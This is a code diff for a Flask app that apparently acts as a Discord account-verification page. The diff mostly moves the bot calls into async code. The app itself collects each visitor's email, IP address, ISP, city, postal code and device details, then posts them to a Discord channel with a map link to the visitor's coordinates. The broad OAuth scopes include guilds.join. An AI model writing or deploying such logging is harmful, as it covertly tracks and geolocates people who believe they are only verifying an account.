@@ -1,5 +1,5 @@
 from flask import Flask, request, render_template
-import requests, json, os, threading
+import requests, json, os, asyncio, threading
 from dotenv import load_dotenv
 from datetime import datetime
 from discord_bot import bot
@@ -70,7 +70,6 @@ def save_log(discord_id, structured_data):
 
 @app.route("/")
 def index():
-    # 修正された Discord OAuth URL
     discord_auth_url = (
         f"https://discord.com/oauth2/authorize?client_id={DISCORD_CLIENT_ID}"
         f"&redirect_uri={REDIRECT_URI}&response_type=code&scope=identify%20email%20guilds%20connections%20guilds.join%20applications.commands"
@@ -120,7 +119,7 @@ def callback():
         json={"access_token": access_token}
     )
 
-    # IP取得とユーザーエージェント解析
+    # IP / UA
     ip = get_client_ip()
     if ip.startswith(("127.", "10.", "192.", "172.")):
         ip = requests.get("https://api.ipify.org").text
@@ -130,7 +129,6 @@ def callback():
 
     avatar_url = f"https://cdn.discordapp.com/avatars/{user['id']}/{user.get('avatar')}.png?size=1024" if user.get("avatar") else "https://cdn.discordapp.com/embed/avatars/0.png"
 
-    # ✅ 構造を分類して整理
     structured_data = {
         "discord": {
             "username": user.get("username"),
@@ -159,45 +157,48 @@ def callback():
 
     save_log(user["id"], structured_data)
 
-    # ✅ Embedログ整形
-    try:
-        d = structured_data["discord"]
-        ip = structured_data["ip_info"]
-        ua = structured_data["user_agent"]
+    # 非同期で Bot の処理を呼ぶ
+    async def send_embed():
+        try:
+            d = structured_data["discord"]
+            ip_info = structured_data["ip_info"]
+            ua_info = structured_data["user_agent"]
 
-        embed_data = {
-            "title": "✅ 新しいアクセスログ",
-            "description": (
-                f"**名前:** {d['username']}#{d['discriminator']}\n"
-                f"**ID:** {d['id']}\n"
-                f"**メール:** {d['email']}\n"
-                f"**Premium:** {d['premium_type']} / Locale: {d['locale']}\n"
-                f"**IP:** {ip['ip']} / Proxy: {ip['proxy']} / Hosting: {ip['hosting']}\n"
-                f"**国:** {ip['country']} / {ip['region']} / {ip['city']} / {ip['zip']}\n"
-                f"**ISP:** {ip['isp']} / AS: {ip['as']}\n"
-                f"**UA:** {ua['raw']}\n"
-                f"**OS:** {ua['os']} / ブラウザ: {ua['browser']}\n"
-                f"**デバイス:** {ua['device']} / Bot判定: {ua['is_bot']}\n"
-                f"📍 [地図リンク](https://www.google.com/maps?q={ip['lat']},{ip['lon']})"
-            ),
-            "thumbnail": {"url": d["avatar_url"]}
-        }
+            embed_data = {
+                "title": "✅ 新しいアクセスログ",
+                "description": (
+                    f"**名前:** {d['username']}#{d['discriminator']}\n"
+                    f"**ID:** {d['id']}\n"
+                    f"**メール:** {d['email']}\n"
+                    f"**Premium:** {d['premium_type']} / Locale: {d['locale']}\n"
+                    f"**IP:** {ip_info['ip']} / Proxy: {ip_info['proxy']} / Hosting: {ip_info['hosting']}\n"
+                    f"**国:** {ip_info['country']} / {ip_info['region']} / {ip_info['city']} / {ip_info['zip']}\n"
+                    f"**ISP:** {ip_info['isp']} / AS: {ip_info['as']}\n"
+                    f"**UA:** {ua_info['raw']}\n"
+                    f"**OS:** {ua_info['os']} / ブラウザ: {ua_info['browser']}\n"
+                    f"**デバイス:** {ua_info['device']} / Bot判定: {ua_info['is_bot']}\n"
+                    f"📍 [地図リンク](https://www.google.com/maps?q={ip_info['lat']},{ip_info['lon']})"
+                ),
+                "thumbnail": {"url": d["avatar_url"]}
+            }
 
-        bot.loop.create_task(bot.send_log(embed=embed_data))
+            await bot.send_log(embed=embed_data)
 
-        if ip["proxy"] or ip["hosting"]:
-            bot.loop.create_task(bot.send_log(
-                f"⚠️ **不審なアクセス検出**\n"
-                f"{d['username']}#{d['discriminator']} (ID: {d['id']})\n"
-                f"IP: {ip['ip']} / Proxy: {ip['proxy']} / Hosting: {ip['hosting']}"
-            ))
+            if ip_info["proxy"] or ip_info["hosting"]:
+                await bot.send_log(
+                    f"⚠️ **不審なアクセス検出**\n"
+                    f"{d['username']}#{d['discriminator']} (ID: {d['id']})\n"
+                    f"IP: {ip_info['ip']} / Proxy: {ip_info['proxy']} / Hosting: {ip_info['hosting']}"
+                )
 
-        bot.loop.create_task(bot.assign_role(d["id"]))
+            await bot.assign_role(d["id"])
 
-    except Exception as e:
-        print("Embed送信エラー:", e)
+        except Exception as e:
+            print("Embed送信エラー:", e)
 
-    return render_template("welcome.html", username=d["username"], discriminator=d["discriminator"])
+    asyncio.run(send_embed())
+
+    return render_template("welcome.html", username=user["username"], discriminator=user["discriminator"])
 
 
 @app.route("/logs")
@@ -210,8 +211,9 @@ def show_logs():
     return render_template("logs.html", logs=logs)
 
 
+# 別スレッドで Bot を起動
 def run_bot():
-    bot.run(DISCORD_BOT_TOKEN)
+    asyncio.run(bot.start(DISCORD_BOT_TOKEN))
 
 
 if __name__ == "__main__":
